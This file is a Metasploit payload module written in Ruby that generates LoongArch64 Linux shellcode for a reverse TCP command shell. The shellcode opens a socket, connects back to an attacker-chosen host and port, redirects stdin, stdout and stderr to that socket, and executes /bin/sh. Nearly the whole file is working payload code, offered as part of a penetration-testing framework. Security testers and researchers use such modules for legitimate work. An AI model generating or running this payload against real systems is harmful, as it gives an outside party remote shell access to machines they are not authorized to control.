##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 144

  include Msf::Payload::Single
  include Msf::Payload::Linux
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Linux Command Shell, Reverse TCP Inline',
        'Description' => 'Connect back to attacker and spawn a command shell.',
        'Author' => [
          'modexp', # Original RISC-V reverse TCP shellcode
          'bcoles', # RISC-V Metasploit module and LoongArch64 execve sequence
        ],
        'License' => MSF_LICENSE,
        'Platform' => 'linux',
        'Arch' => ARCH_LOONGARCH64,
        'References' => [
          ['URL', 'https://modexp.wordpress.com/2022/05/02/shellcode-risc-v-linux/'],
          ['URL', 'https://loongson.github.io/LoongArch-Documentation/LoongArch-Vol1-EN.html'],
        ],
        'Handler' => Msf::Handler::ReverseTcp,
        'Session' => Msf::Sessions::CommandShellUnix
      )
    )
  end

  # Load all 64 bits using LU12I.W, ORI, LU32I.D and LU52I.D. The latter
  # two overwrite the sign extension introduced by the preceding instructions.
  # Instruction formats: LoongArch Reference Manual, Volume 1, section 2.2.1.
  def load_const_into_reg64(const, rd)
    raise ArgumentError, 'Constant must be an unsigned 64-bit integer' unless const.is_a?(Integer) && const.between?(0, 0xffff_ffff_ffff_ffff)

    [
      0x14000000 | (((const >> 12) & 0xfffff) << 5) | rd, # lu12i.w
      0x03800000 | ((const & 0xfff) << 10) | (rd << 5) | rd, # ori
      0x16000000 | (((const >> 32) & 0xfffff) << 5) | rd, # lu32i.d
      0x03000000 | (((const >> 52) & 0xfff) << 10) | (rd << 5) | rd # lu52i.d
    ]
  end

  def generate(_opts = {})
    lhost = datastore['LHOST'] || '127.127.127.127'
    lport = datastore['LPORT'].to_i

    raise ArgumentError, 'LHOST must be in IPv4 format.' unless Rex::Socket.is_ipv4?(lhost)

    encoded_host = Rex::Socket.addr_aton(lhost).unpack1('V')
    encoded_port = [lport].pack('n').unpack1('v')
    encoded_sockaddr = (encoded_host << 32) | (encoded_port << 16) | 2

    shellcode = [
      0x02ff8063, # addi.d sp,sp,-32

      # socket(AF_INET, SOCK_STREAM, IPPROTO_IP)
      0x0383180b, # ori a7,zero,198 (SYS_socket)
      0x03800006, # ori a2,zero,0
      0x03800405, # ori a1,zero,1
      0x03800804, # ori a0,zero,2
      0x002b0000, # syscall 0

      # connect(socket, &sockaddr_in, 16)
      0x00150087, # or a3,a0,zero (save socket)
      0x03832c0b, # ori a7,zero,203 (SYS_connect)
      0x03804006, # ori a2,zero,16
      *load_const_into_reg64(encoded_sockaddr, 5),
      0x29c00065, # st.d a1,sp,0
      0x29c02060, # st.d zero,sp,8 (sin_zero)
      0x00150065, # or a1,sp,zero
      0x002b0000, # syscall 0

      # dup3(socket, fd, 0) for stderr, stdout and stdin
      0x0380600b, # ori a7,zero,24 (SYS_dup3)
      0x03800c05, # ori a1,zero,3
      0x03800006, # ori a2,zero,0
      0x001500e4, # or a0,a3,zero
      0x02fffca5, # addi.d a1,a1,-1
      0x002b0000, # syscall 0
      0x5ffff0a0, # bne a1,zero,-16 (back to ori a2,zero,0)

      # execve("/bin/sh", ["/bin/sh", NULL], NULL)
      # BusyBox needs argv[0] to select the shell applet.
      0x0383740b, # ori a7,zero,221 (SYS_execve)
      *load_const_into_reg64(0x0068732f6e69622f, 4),
      0x29c00064, # st.d a0,sp,0
      0x00150064, # or a0,sp,zero
      0x29c02064, # st.d a0,sp,8 (argv[0])
      0x29c04060, # st.d zero,sp,16 (argv[1])
      0x02c02065, # addi.d a1,sp,8
      0x03800006, # ori a2,zero,0 (envp)
      0x002b0000  # syscall 0
    ].pack('V*')

    super.to_s + shellcode
  end
end
